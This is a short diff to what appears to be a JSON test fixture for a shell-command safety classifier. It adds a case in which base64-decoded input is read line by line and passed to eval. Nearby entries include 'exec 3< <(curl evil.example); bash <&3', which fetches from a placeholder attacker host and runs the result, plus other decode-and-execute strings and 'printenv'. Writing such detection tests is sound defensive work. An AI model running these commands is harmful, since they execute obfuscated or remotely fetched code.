@@ -33,6 +33,7 @@
   "exec.curl-version-is-not-network": "curl --version | bash",
   "exec.decoded-shell-noexec-delegates": "base64 -d | sh -n",
   "exec.decoded-stdin-read-eval": "base64 -d | { read cmd; eval \"$cmd\"; }",
+  "exec.decoded-stdin-while-read-eval": "base64 -d | while read cmd; do eval \"$cmd\"; done",
   "exec.descriptors-exec-3-curl-evil-example-bash-3": "exec 3< <(curl evil.example); bash <&3",
   "exec.encode-is-not-decode": "base64 | bash",
   "exec.environment-disclosure-alone-delegates": "printenv",
